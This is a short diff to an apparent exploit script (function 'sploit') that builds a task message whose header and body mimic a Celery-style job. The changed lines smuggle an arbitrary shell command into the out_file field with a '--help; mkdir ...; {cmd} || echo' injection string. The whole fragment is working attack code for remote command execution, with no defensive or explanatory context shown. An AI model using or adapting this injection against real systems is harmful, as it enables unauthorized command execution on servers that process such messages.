@@ -14,8 +14,8 @@ def sploit(url, cmd=''):
     b64payl = base64.b64decode(base_p['body'])
     # print(b64payl)
     # print("===========CHANGED===============")
-    out_file = '--help;'
-    dir = '{} || echo '.format(cmd)
+    out_file = '--help; mkdir -p /tmp/somefolder; {} || echo '.format(cmd)
+    dir = '/tmp/somefolder'
 
     base_p['headers']['origin'] = 'test'
     base_p['body'] = '[["%s", "%s"], {}, {"callbacks": null, "errbacks": null, "chain": null, "chord": null}]' % (
